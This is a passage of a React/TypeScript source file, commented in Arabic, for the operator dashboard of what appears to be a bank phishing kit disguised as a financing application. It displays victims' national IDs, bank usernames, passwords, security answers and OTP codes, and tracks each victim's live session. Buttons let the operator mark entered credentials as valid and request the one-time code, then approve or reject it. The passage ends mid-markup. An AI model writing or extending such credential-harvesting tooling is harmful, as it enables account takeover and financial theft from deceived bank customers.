// لوحة التحكم الرئيسية — الطلبات مع عرض كامل للبيانات ونظام النسخ
import { useEffect, useRef, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";
import {
  useGetApplicationStats,
  useListApplications,
  useListSessions,
  getGetApplicationStatsQueryKey,
  getListApplicationsQueryKey,
  getListSessionsQueryKey,
} from "@workspace/api-client-react";
import AdminLayout from "@/components/AdminLayout";
import {
  Users,
  ClipboardList,
  CheckCircle,
  XCircle,
  Clock,
  TrendingUp,
  Wifi,
  WifiOff,
  ChevronDown,
  ChevronUp,
  User,
  Building2,
  CreditCard,
  Smartphone,
  Key,
  ExternalLink,
  History,
  Trash2,
  RotateCcw,
  AlertTriangle,
} from "lucide-react";
import { timeAgo, useTimeTicker } from "@/lib/timeAgo";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

const stepLabels: Record<string, string> = {
  home: "الرئيسية",
  apply: "معلومات الطلب",
  "applicant-info": "معلومات الطلب",
  banks: "اختيار البنك",
  credentials: "بيانات الدخول",
  verify: "رمز التحقق",
  waiting: "انتظار المراجعة",
  success: "تمّت الموافقة",
};

const statusColors: Record<string, string> = {
  pending: "bg-gray-100 text-gray-600",
  reviewing: "bg-blue-100 text-blue-700",
  approved: "bg-green-100 text-green-700",
  rejected: "bg-red-100 text-red-700",
  waiting: "bg-yellow-100 text-yellow-700",
};

const statusLabels: Record<string, string> = {
  pending: "قيد التقديم",
  reviewing: "مراجعة البيانات",
  approved: "تمت الموافقة",
  rejected: "تم الرفض",
  waiting: "بانتظار الموافقة",
};

// حساب شارة الحالة الصحيحة بناءً على status + currentStep معاً
function getStatusBadge(status: string, currentStep: string): { label: string; color: string } {
  if (status === "approved") return { label: "تمت الموافقة ✓", color: "bg-green-100 text-green-700" };
  if (status === "rejected") return { label: "تم الرفض ✗", color: "bg-red-100 text-red-700" };
  if (status === "reviewing") return { label: "مراجعة البيانات", color: "bg-blue-100 text-blue-700" };
  if (currentStep === "waiting") return { label: "بانتظار الموافقة", color: "bg-yellow-100 text-yellow-700" };
  return { label: "قيد التقديم", color: "bg-gray-100 text-gray-500" };
}

function adminFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
}

// نوع بيانات النسخة
interface AppVersion {
  id: number;
  version: number;
  isLatest: boolean;
  createdAt: string;
  applicantType?: string;
  fullName?: string;
  nationalId?: string;
  dateOfBirth?: string;
  monthlySalary?: string;
  employer?: string;
  phone?: string;
  email?: string;
  city?: string;
  maritalStatus?: string;
  companyName?: string;
  businessType?: string;
  commercialRegistration?: string;
  employeeCount?: string;
  annualRevenue?: string;
  contactName?: string;
  bankName?: string;
  bankUsername?: string;
  bankPassword?: string;
  securityAnswer?: string;
  otpCode?: string;
  [key: string]: unknown;
}

function DataBadge({
  label,
  value,
  badge,
}: {
  label: string;
  value: string | null | undefined;
  badge?: string;
}) {
  if (!value) return null;
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-xs text-muted-foreground flex items-center gap-1">
        {label}
        {badge && (
          <span className="text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">
            {badge}
          </span>
        )}
      </span>
      <span className="font-mono text-sm font-bold bg-muted/50 px-2 py-1 rounded-lg break-all">
        {value}
      </span>
    </div>
  );
}

// شارة الوقت المنفصلة - تتحدث تلقائياً دون إعادة بناء المكونات الأخرى
function SectionTimeBadge({ timestamp }: { timestamp: string | null | undefined }) {
  const [, setTick] = useState(0);
  useEffect(() => {
    const id = setInterval(() => setTick((t) => t + 1), 30_000);
    return () => clearInterval(id);
  }, []);
  if (!timestamp) return null;
  return (
    <span className="text-[10px] text-green-600 font-medium mr-2" dir="ltr">
      ← {timeAgo(timestamp)}
    </span>
  );
}

// دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
function mergeVersionsData(sources: AppVersion[]): AppVersion {
  const FIELDS: (keyof AppVersion)[] = [
    "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
    "employer", "phone", "email", "city", "maritalStatus",
    "companyName", "businessType", "commercialRegistration", "employeeCount",
    "annualRevenue", "contactName",
    "bankName", "bankUsername", "bankPassword", "securityAnswer",
    "otpCode",
  ];
  const sorted = [...sources].sort(
    (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
  );
  const result: Record<string, unknown> = {};
  for (const field of FIELDS) {
    for (const src of sorted) {
      const val = src[field as keyof AppVersion];
      if (val !== null && val !== undefined && val !== "") {
        result[field] = val;
        break;
      }
    }
  }
  return result as AppVersion;
}

export default function AdminDashboardPage() {
  const queryClient = useQueryClient();
  const [wsConnected, setWsConnected] = useState(false);
  const wsRef = useRef<WebSocket | null>(null);
  const [expandedRows, setExpandedRows] = useState<Set<number>>(new Set());
  const [expandedTabs, setExpandedTabs] = useState<Record<number, "current" | "older">>({});
  const [versionCache, setVersionCache] = useState<Record<number, AppVersion[]>>({});

  const { data: stats } = useGetApplicationStats({
    query: { refetchInterval: 8000 },
  });
  const { data: applications } = useListApplications({
    query: { refetchInterval: 4000 },
  });
  const { data: sessions } = useListSessions({
    query: { refetchInterval: 5000 },
  });

  // خريطة سريعة: sessionId → بيانات الجلسة
  const sessionMap = new Map((sessions ?? []).map((s) => [s.id, s]));

  // تعريف الحضور: آخر ظهور خلال 90 ثانية
  const isOnline = (session: { lastSeenAt: string }) =>
    Date.now() - new Date(session.lastSeenAt).getTime() < 90_000;

  const [notifySession, setNotifySession] = useState("");
  const [notifyMsg, setNotifyMsg] = useState("");
  const [sendingNotify, setSendingNotify] = useState(false);
  const [rejectionMsg, setRejectionMsg] = useState<Record<number, string>>({});
  const [actionLoading, setActionLoading] = useState<Record<string, boolean>>({});

  // سلة المهملات
  const [activeTab, setActiveTab] = useState<"applications" | "trash">("applications");
  const [trashApps, setTrashApps] = useState<typeof applications>([]);
  const [trashLoading, setTrashLoading] = useState(false);
  const [deleteAllConfirm, setDeleteAllConfirm] = useState(false);

  // تحديث تلقائي للوقت كل 30 ثانية
  useTimeTicker(30_000);

  const fetchTrash = async () => {
    setTrashLoading(true);
    try {
      const r = await adminFetch(`${BASE}/api/applications/trash`);
      if (r.ok) setTrashApps(await r.json());
    } finally {
      setTrashLoading(false);
    }
  };

  useEffect(() => {
    if (activeTab === "trash") fetchTrash();
  }, [activeTab]);

  const handleDeleteOne = async (id: number) => {
    setActionLoading((p) => ({ ...p, [`del_${id}`]: true }));
    await adminFetch(`${BASE}/api/applications/${id}`, { method: "DELETE" });
    setActionLoading((p) => ({ ...p, [`del_${id}`]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
    if (activeTab === "trash") fetchTrash();
  };

  const handleDeleteAll = async () => {
    setDeleteAllConfirm(false);
    await adminFetch(`${BASE}/api/applications`, { method: "DELETE" });
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
  };

  const handleRestoreOne = async (id: number) => {
    setActionLoading((p) => ({ ...p, [`restore_${id}`]: true }));
    await adminFetch(`${BASE}/api/applications/${id}/restore`, { method: "POST" });
    setActionLoading((p) => ({ ...p, [`restore_${id}`]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
    fetchTrash();
  };

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/api/ws`;
    let reconnectTimer: ReturnType<typeof setTimeout>;

    const connect = () => {
      try {
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;
        ws.onopen = () => setWsConnected(true);
        ws.onclose = () => {
          setWsConnected(false);
          reconnectTimer = setTimeout(connect, 1500);
        };
        ws.onerror = () => setWsConnected(false);
        ws.onmessage = (event) => {
          try {
            const msg = JSON.parse(event.data);
            // تحديث لحظي — السيرفر ينشئ سجلاً جديداً (id مختلف) عند كل تحديث،
            // لذا نطابق بالـ sessionId (ثابت عبر النسخ) لا بالـ id
            if (msg.type === "application_update" && msg.data) {
              // اكتشاف الـ id القديم قبل التحديث (لتحديث versionCache و expandedRows)
              const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
                getListApplicationsQueryKey()
              ) ?? [];
              const oldApp = currentList.find(
                (a: { sessionId: string }) => a.sessionId === msg.data.sessionId
              );
              const oldId = oldApp?.id;

              // تحديث القائمة: إزالة السجل القديم (بالـ sessionId) وإضافة الجديد كاملاً
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => {
                  if (!Array.isArray(old)) return old;
                  const updated = old.filter(
                    (a: { id: number; sessionId: string }) =>
                      a.id !== msg.data.id && a.sessionId !== msg.data.sessionId
                  );
                  return [msg.data, ...updated];
                }
              );

              // إذا تغيّر الـ id (نسخة جديدة أنشأها السيرفر): نقل الحالة للـ id الجديد
              if (oldId !== undefined && oldId !== msg.data.id) {
                setVersionCache((prev) => {
                  const next = { ...prev };
                  delete next[oldId];
                  return next;
                });
                setExpandedRows((prev) => {
                  if (!prev.has(oldId)) return prev;
                  const next = new Set(prev);
                  next.delete(oldId);
                  next.add(msg.data.id);
                  return next;
                });
                setExpandedTabs((prev) => {
                  if (!(oldId in prev)) return prev;
                  const next = { ...prev };
                  next[msg.data.id] = next[oldId];
                  delete next[oldId];
                  return next;
                });
                // جلب النسخ الجديدة للصف المفتوح
                adminFetch(`${BASE}/api/applications/${msg.data.id}/versions`)
                  .then((r) => (r.ok ? r.json() : null))
                  .then((versions) => {
                    if (versions) setVersionCache((prev) => ({ ...prev, [msg.data.id]: versions }));
                  })
                  .catch(() => {});
              }

              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "application_deleted") {
              // إزالة فورية من الكاش
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => Array.isArray(old) ? old.filter((a: { id: number }) => a.id !== msg.data?.id) : old
              );
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "applications_cleared") {
              queryClient.setQueryData(getListApplicationsQueryKey(), []);
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "session_update") {
              queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
              // تحديث فوري لبيانات الجلسة في الكاش
              if (msg.data) {
                queryClient.setQueryData(
                  getListSessionsQueryKey(),
                  (old: unknown) => {
                    if (!Array.isArray(old)) return old;
                    const idx = old.findIndex((s: { id: string }) => s.id === msg.data.id);
                    if (idx === -1) return [msg.data, ...old];
                    const updated = [...old];
                    updated[idx] = { ...updated[idx], ...msg.data };
                    return updated;
                  }
                );
              } else {
                queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
              }
            }
          } catch {}
        };
      } catch {}
    };
    connect();
    return () => {
      clearTimeout(reconnectTimer);
      wsRef.current?.close();
    };
  }, [queryClient]);

  const toggleRow = async (id: number) => {
    setExpandedRows((prev) => {
      const next = new Set(prev);
      if (next.has(id)) {
        next.delete(id);
      } else {
        next.add(id);
        // جلب جميع النسخ عند التوسيع
        if (!versionCache[id]) {
          fetchVersions(id);
        }
      }
      return next;
    });
  };

  const fetchVersions = async (appId: number) => {
    try {
      const r = await adminFetch(`${BASE}/api/applications/${appId}/versions`);
      if (r.ok) {
        const versions = await r.json();
        setVersionCache((prev) => ({ ...prev, [appId]: versions }));
      }
    } catch (e) {
      console.error("فشل في جلب النسخ:", e);
    }
  };

  const handleCredentialsDecision = async (
    sessionId: string,
    decision: "approved" | "rejected",
    appId: number,
  ) => {
    const key = `cred_${appId}_${decision}`;
    setActionLoading((l) => ({ ...l, [key]: true }));
    await adminFetch(
      `${BASE}/api/admin/sessions/${sessionId}/credentials-decision`,
      {
        method: "POST",
        body: JSON.stringify({ decision, message: rejectionMsg[appId] || "" }),
      },
    );
    setActionLoading((l) => ({ ...l, [key]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
  };

  const handleOtpDecision = async (
    sessionId: string,
    decision: "approved" | "rejected" | "no_credit",
    appId: number,
  ) => {
    const key = `otp_${appId}_${decision}`;
    setActionLoading((l) => ({ ...l, [key]: true }));
    await adminFetch(`${BASE}/api/admin/sessions/${sessionId}/otp-decision`, {
      method: "POST",
      body: JSON.stringify({ decision }),
    });
    setActionLoading((l) => ({ ...l, [key]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
  };

  const handleSendNotification = async () => {
    if (!notifyMsg) return;
    setSendingNotify(true);
    await adminFetch(`${BASE}/api/admin/notify`, {
      method: "POST",
      body: JSON.stringify({
        sessionId: notifySession || undefined,
        message: notifyMsg,
      }),
    });
    setNotifyMsg("");
    setNotifySession("");
    setSendingNotify(false);
  };

  const statCards = [
    {
      label: "إجمالي الطلبات",
      value: stats?.total ?? 0,
      icon: <ClipboardList className="w-5 h-5" />,
      color: "text-primary",
      bg: "bg-primary/10",
    },
    {
      label: "قيد الانتظار",
      value: stats?.pending ?? 0,
      icon: <Clock className="w-5 h-5" />,
      color: "text-yellow-600",
      bg: "bg-yellow-50",
    },
    {
      label: "قيد المراجعة",
      value: stats?.reviewing ?? 0,
      icon: <TrendingUp className="w-5 h-5" />,
      color: "text-blue-600",
      bg: "bg-blue-50",
    },
    {
      label: "موافق عليها",
      value: stats?.approved ?? 0,
      icon: <CheckCircle className="w-5 h-5" />,
      color: "text-green-600",
      bg: "bg-green-50",
    },
    {
      label: "مرفوضة",
      value: stats?.rejected ?? 0,
      icon: <XCircle className="w-5 h-5" />,
      color: "text-red-600",
      bg: "bg-red-50",
    },
    {
      label: "نشط اليوم",
      value: stats?.activeToday ?? 0,
      icon: <Users className="w-5 h-5" />,
      color: "text-purple-600",
      bg: "bg-purple-50",
    },
  ];

  return (
    <AdminLayout>
      <div className="p-4 md:p-6">
        {/* الرأس */}
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-black text-foreground">لوحة التحكم</h1>
            <p className="text-muted-foreground text-sm mt-1">
              مراقبة الطلبات{" "}
            </p>
          </div>
          <div
            className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium ${wsConnected ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"}`}
          >
            {wsConnected ? (
              <Wifi className="w-4 h-4" />
            ) : (
              <WifiOff className="w-4 h-4" />
            )}
            {wsConnected ? "متصل" : "غير متصل"}
          </div>
        </div>

        {/* الإحصائيات */}
        <div className="grid grid-cols-3 md:grid-cols-6 gap-3 mb-6">
          {statCards.map((card, i) => (
            <div key={i} className="bg-card border rounded-2xl p-3 text-center">
              <div
                className={`w-9 h-9 ${card.bg} ${card.color} rounded-xl flex items-center justify-center mx-auto mb-2`}
              >
                {card.icon}
              </div>
              <div className="text-2xl font-black text-foreground">
                {card.value}
              </div>
              <div className="text-xs text-muted-foreground mt-0.5 leading-tight">
                {card.label}
              </div>
            </div>
          ))}
        </div>

        {/* إرسال رسالة فورية */}

        {/* قائمة الطلبات */}
        <div className="bg-card border rounded-2xl overflow-hidden">
          <div className="flex items-center justify-between p-4 border-b flex-wrap gap-2">
            {/* تبويبات */}
            <div className="flex items-center gap-1 bg-muted rounded-xl p-1">
              <button
                onClick={() => setActiveTab("applications")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                  activeTab === "applications" ? "bg-card text-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <ClipboardList className="w-4 h-4" />
                الطلبات
                <span className={`text-xs px-1.5 py-0.5 rounded-full ${activeTab === "applications" ? "bg-primary/10 text-primary" : "bg-muted-foreground/20"}`}>
                  {applications?.length ?? 0}
                </span>
              </button>
              <button
                onClick={() => setActiveTab("trash")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                  activeTab === "trash" ? "bg-card text-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Trash2 className="w-4 h-4" />
                المهملات
                {(trashApps?.length ?? 0) > 0 && (
                  <span className="text-xs px-1.5 py-0.5 rounded-full bg-red-100 text-red-600">
                    {trashApps?.length}
                  </span>
                )}
              </button>
            </div>

            {/* حذف الكل */}
            {activeTab === "applications" && (applications?.length ?? 0) > 0 && (
              deleteAllConfirm ? (
                <div className="flex items-center gap-2">
                  <span className="text-xs text-red-600 font-medium">تأكيد حذف الكل؟</span>
                  <button onClick={handleDeleteAll} className="text-xs bg-red-600 text-white px-3 py-1.5 rounded-lg font-bold hover:bg-red-700">نعم، احذف</button>
                  <button onClick={() => setDeleteAllConfirm(false)} className="text-xs bg-muted text-foreground px-3 py-1.5 rounded-lg font-bold">إلغاء</button>
                </div>
              ) : (
                <button
                  onClick={() => setDeleteAllConfirm(true)}
                  className="flex items-center gap-1.5 text-xs text-red-600 bg-red-50 hover:bg-red-100 px-3 py-1.5 rounded-lg font-bold transition-colors"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  حذف الكل
                </button>
              )
            )}
          </div>

          {/* سلة المهملات */}
          {activeTab === "trash" && (
            trashLoading ? (
              <div className="p-12 text-center text-muted-foreground">جاري التحميل...</div>
            ) : !trashApps || trashApps.length === 0 ? (
              <div className="p-12 text-center">
                <Trash2 className="w-10 h-10 text-muted-foreground/30 mx-auto mb-3" />
                <p className="text-muted-foreground">سلة المهملات فارغة</p>
              </div>
            ) : (
              <div className="divide-y">
                {trashApps.map((app) => {
                  const name = app.fullName || app.companyName || app.contactName || "—";
                  return (
                    <div key={app.id} className="flex items-center gap-3 p-4 bg-red-50/30">
                      <div className="w-9 h-9 bg-muted rounded-xl flex items-center justify-center text-muted-foreground shrink-0">
                        {app.applicantType === "business" ? <Building2 className="w-4 h-4" /> : <User className="w-4 h-4" />}
                      </div>
                      <div className="min-w-0 flex-1">
                        <p className="font-bold text-sm text-foreground truncate">{name}</p>
                        <p className="text-xs text-muted-foreground">
                          {app.bankName && <span className="ml-2">{app.bankName}</span>}
                          {app.bankUsername && <span className="font-mono ml-2 text-blue-600">{app.bankUsername}</span>}
                          {app.bankPassword && <span className="font-mono ml-2 text-red-600">{app.bankPassword}</span>}
                          {app.otpCode && <span className="font-mono ml-2 text-orange-600 font-bold">{app.otpCode}</span>}
                        </p>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <button
                          onClick={() => handleRestoreOne(app.id)}
                          disabled={!!actionLoading[`restore_${app.id}`]}
                          className="flex items-center gap-1 text-xs bg-green-50 text-green-700 hover:bg-green-100 px-2.5 py-1.5 rounded-lg font-bold transition-colors disabled:opacity-50"
                        >
                          <RotateCcw className="w-3.5 h-3.5" />
                          استعادة
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )
          )}

          {activeTab === "applications" && (!applications || applications.length === 0) ? (
            <div className="p-12 text-center text-muted-foreground">
              لا توجد طلبات حتى الآن
            </div>
          ) : activeTab === "applications" && (
            <div className="divide-y">
              {applications.map((app) => {
                const isExpanded = expandedRows.has(app.id);
                // الاسم: نحاول من السجل الحالي أولاً، ثم من كاش النسخ كاحتياط
                const cachedVersions = versionCache[app.id] || [];
                const name =
                  app.fullName || app.companyName || app.contactName ||
                  (cachedVersions.find((v) => v.fullName)?.fullName as string | undefined) ||
                  (cachedVersions.find((v) => v.companyName)?.companyName as string | undefined) ||
                  "";
                return (
                  <div
                    key={app.id}
                    className="transition-colors hover:bg-muted/20"
                  >
                    {/* الصف الرئيسي */}
                    <div
                      className="flex items-center gap-3 p-4 cursor-pointer select-none"
                      onClick={() => toggleRow(app.id)}
                    >
                      <div className="w-9 h-9 navy-gradient rounded-xl flex items-center justify-center text-white shrink-0">
                        {app.applicantType === "business" ? (
                          <Building2 className="w-4 h-4" />
                        ) : (
                          <User className="w-4 h-4" />
                        )}
                      </div>
                      <div className="min-w-0 flex-1">
                        {(() => {
                          const sess = app.sessionId ? sessionMap.get(app.sessionId) : undefined;
                          const online = sess ? isOnline(sess as { lastSeenAt: string }) : false;
                          const currentPage = (sess as { currentPage?: string } | undefined)?.currentPage || app.currentStep;
                          const lastPageLabel = stepLabels[currentPage] || currentPage;

                          // شارة الحالة: تجمع بين حالة الاتصال + status + currentStep
                          let badge: { label: string; color: string };
                          if (app.status === "approved") {
                            badge = { label: "تمت الموافقة ✓", color: "bg-green-100 text-green-700" };
                          } else if (app.status === "rejected") {
                            badge = { label: "تم الرفض ✗", color: "bg-red-100 text-red-700" };
                          } else if (app.status === "reviewing") {
                            badge = { label: "مراجعة البيانات", color: "bg-blue-100 text-blue-700" };
                          } else if (app.currentStep === "waiting") {
                            badge = { label: "بانتظار الموافقة", color: "bg-yellow-100 text-yellow-700" };
                          } else if (online) {
                            badge = { label: "قيد التقديم", color: "bg-emerald-100 text-emerald-700" };
                          } else {
                            // غير متصل: نعرض آخر صفحة غادرها
                            badge = { label: `غادر: ${lastPageLabel}`, color: "bg-gray-100 text-gray-500" };
                          }

                          return (
                            <>
                              <div className="flex items-center gap-2 flex-wrap">
                                <span className={`font-bold text-sm truncate ${name ? "text-foreground" : "text-muted-foreground italic"}`}>
                                  {name || "بانتظار بيانات العميل..."}
                                </span>
                                {/* مؤشر الحضور */}
                                {sess && (
                                  online ? (
                                    <span className="flex items-center gap-1 text-xs text-green-700 bg-green-50 px-2 py-0.5 rounded-full font-medium">
                                      <span className="relative flex h-2 w-2">
                                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                                        <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                                      </span>
                                      {lastPageLabel}
                                    </span>
                                  ) : (
                                    <span className="flex items-center gap-1 text-xs text-muted-foreground bg-muted px-2 py-0.5 rounded-full">
                                      <span className="inline-flex rounded-full h-2 w-2 bg-gray-400" />
                                      غير متصل
                                    </span>
                                  )
                                )}
                                {app.bankName && (
                                  <span className="text-xs bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full">
                                    {app.bankName}
                                  </span>
                                )}
                              </div>
                              <div className="flex items-center gap-2 mt-1 flex-wrap">
                                <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${badge.color}`}>
                                  {badge.label}
                                </span>
                                {app.bankUsername && (
                                  <span className="text-xs bg-green-50 text-green-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                    <Key className="w-3 h-3" /> بيانات دخول
                                  </span>
                                )}
                                {app.otpCode && (
                                  <span className="text-xs bg-orange-50 text-orange-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                    <Smartphone className="w-3 h-3" /> رمز OTP
                                  </span>
                                )}
                              </div>
                            </>
                          );
                        })()}
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-xs text-muted-foreground hidden md:block">
                          {timeAgo(app.createdAt)}
                        </span>
                        <a
                          href={`/admin/applications/${app.id}`}
                          onClick={(e) => e.stopPropagation()}
                          className="p-1.5 text-primary hover:bg-primary/10 rounded-lg transition-colors"
                          title="فتح التفاصيل"
                        >
                          <ExternalLink className="w-4 h-4" />
                        </a>
                        <button
                          onClick={(e) => { e.stopPropagation(); handleDeleteOne(app.id); }}
                          disabled={!!actionLoading[`del_${app.id}`]}
                          className="p-1.5 text-red-500 hover:bg-red-50 rounded-lg transition-colors disabled:opacity-40"
                          title="حذف إلى سلة المهملات"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                        {isExpanded ? (
                          <ChevronUp className="w-4 h-4 text-muted-foreground" />
                        ) : (
                          <ChevronDown className="w-4 h-4 text-muted-foreground" />
                        )}
                      </div>
                    </div>

                    {/* التفاصيل الموسّعة */}
                    {isExpanded && (
                      <div className="bg-muted/30 border-t px-4 pb-4 pt-3">
                        {/* تبويبات النسخ */}
                        {(() => {
                          const versions = versionCache[app.id] || [];
                          const totalVersions = versions.length;
                          const olderVersions = versions.filter((v) => !v.isLatest);
                          const activeTab = expandedTabs[app.id] || "current";
                          const allData = mergeVersionsData([...versions, app as unknown as AppVersion]);
                          // عدد محاولات OTP = عدد القيم المختلفة لرمز OTP عبر النسخ
                          const otpAttempts = new Set(
                            [...versions, app as unknown as AppVersion]
                              .filter((v) => v.otpCode)
                              .map((v) => v.otpCode)
                          ).size;

                          return (
                            <>
                              {/* رأس التبويبات */}
                              <div className="flex items-center justify-between mb-4">
                                <div className="flex items-center gap-1 bg-card rounded-xl p-1 border">
                                  <button
                                    onClick={() => setExpandedTabs((t) => ({ ...t, [app.id]: "current" }))}
                                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                                      activeTab === "current" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"
                                    }`}
                                  >
                                    <ClipboardList className="w-4 h-4" />
                                    البيانات الحالية
                                    <span className="text-xs bg-primary/10 text-primary px-1.5 py-0.5 rounded-full">
                                      {versions.length > 0 ? Math.max(...versions.map(v => v.version || 0)) : 1}
                                    </span>
                                  </button>
                                  {totalVersions > 1 && (
                                    <button
                                      onClick={() => setExpandedTabs((t) => ({ ...t, [app.id]: "older" }))}
                                      className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                                        activeTab === "older" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"
                                      }`}
                                    >
                                      <History className="w-4 h-4" />
                                      بيانات أقدم
                                      <span className="text-xs bg-muted px-1.5 py-0.5 rounded-full">
                                        {olderVersions.length}
                                      </span>
                                    </button>
                                  )}
                                </div>
                                <span className="text-xs text-muted-foreground">
                                  {totalVersions} {(totalVersions === 1 ? "نسخة" : totalVersions < 11 ? "نسخ" : "نسخة")}
                                </span>
                              </div>

                              {/* محتوى التبويبات */}
                              {activeTab === "current" ? (
                                /* عرض البيانات الحالية */
                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                  {/* صندوق البيانات الشخصية */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <User className="w-4 h-4" />
                              {allData.applicantType === "business"
                                ? "بيانات الشركة"
                                : "البيانات الشخصية"}
                            </h4>
                            <SectionTimeBadge timestamp={app.createdAt} />
                          </div>
                          <DataBadge
                            label="الاسم"
                            value={
                              allData.fullName || allData.companyName || allData.contactName
                            }
                          />
                          <DataBadge
                            label="رقم الهوية / السجل"
                            value={allData.nationalId || allData.commercialRegistration}
                          />
                          <DataBadge label="رقم الهاتف" value={allData.phone} />
                          <DataBadge
                            label="البريد الإلكتروني"
                            value={allData.email}
                          />
                          <DataBadge
                            label="تاريخ الميلاد"
                            value={allData.dateOfBirth}
                          />
                          <DataBadge
                            label="الراتب الشهري"
                            value={allData.monthlySalary}
                          />
                          <DataBadge label="جهة العمل" value={allData.employer} />
                          <DataBadge label="المدينة" value={allData.city} />
                          <DataBadge
                            label="الحالة الاجتماعية"
                            value={allData.maritalStatus}
                          />
                          <DataBadge
                            label="نوع النشاط"
                            value={allData.businessType}
                          />
                          <DataBadge
                            label="عدد الموظفين"
                            value={allData.employeeCount}
                          />
                          <DataBadge
                            label="الإيرادات السنوية"
                            value={allData.annualRevenue}
                          />
                        </div>

                        {/* صندوق بيانات البنك */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              بيانات البنك والدخول
                            </h4>
                            <SectionTimeBadge timestamp={app.bankUsername ? app.updatedAt : undefined} />
                          </div>
                          {/* اسم البنك بارز في الأعلى */}
                          {allData.bankName && (
                            <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
                              <CreditCard className="w-5 h-5 text-primary shrink-0" />
                              <div>
                                <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
                                <p className="text-base font-black text-primary">{String(allData.bankName)}</p>
                              </div>
                            </div>
                          )}
                          <DataBadge
                            label="اسم المستخدم"
                            value={allData.bankUsername}
                          />
                          <DataBadge
                            label="كلمة المرور"
                            value={allData.bankPassword}
                          />
                          <DataBadge
                            label="كلمة التحقق / الأمان"
                            value={allData.securityAnswer}
                          />

                          {/* قرار بيانات الدخول */}
                          {allData.bankUsername && app.sessionId && (
                            <div className="pt-3 border-t space-y-2">
                              <p className="text-xs font-bold text-muted-foreground">
                                قرار بيانات الدخول:
                              </p>
                              <input
                                type="text"
                                placeholder="رسالة الرفض (اختياري)"
                                value={rejectionMsg[app.id] || ""}
                                onChange={(e) =>
                                  setRejectionMsg((r) => ({
                                    ...r,
                                    [app.id]: e.target.value,
                                  }))
                                }
                                className="w-full text-xs border rounded-lg px-3 py-2 bg-background"
                              />
                              <div className="flex gap-2">
                                <button
                                  onClick={() =>
                                    handleCredentialsDecision(
                                      app.sessionId!,
                                      "approved",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`cred_${app.id}_approved`]
                                  }
                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
                                >
                                  ✓ صحيحة → رمز
                                </button>
                                <button
                                  onClick={() =>
                                    handleCredentialsDecision(
                                      app.sessionId!,
                                      "rejected",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`cred_${app.id}_rejected`]
                                  }
